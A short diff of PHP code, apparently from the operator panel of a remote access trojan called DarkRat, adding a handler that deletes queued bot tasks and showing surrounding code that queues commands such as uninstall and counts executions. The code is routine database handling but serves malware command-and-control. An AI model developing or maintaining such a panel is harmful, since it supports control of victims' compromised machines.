@@ -21,6 +21,10 @@ class Main{
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
+            if(!empty($_POST["delete"])){
+                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks WHERE id = ?");
+                $statement->execute(array($_POST["taskid"]));
+            }
             if(!empty($_POST["task"])) {
                 if($_POST["task"] == "uninstall") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
@@ -41,8 +45,6 @@ class Main{
                 $statement->execute(array($taskstatus, $_POST["taskid"]));
                 header("Refresh: 0");
             }
-
-
             $sql = "SELECT COUNT(tasks_completed.id) as executions, tasks.* FROM tasks LEFT JOIN tasks_completed ON tasks.id = tasks_completed.taskid GROUP BY tasks.id";
             $allTasks = array();
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
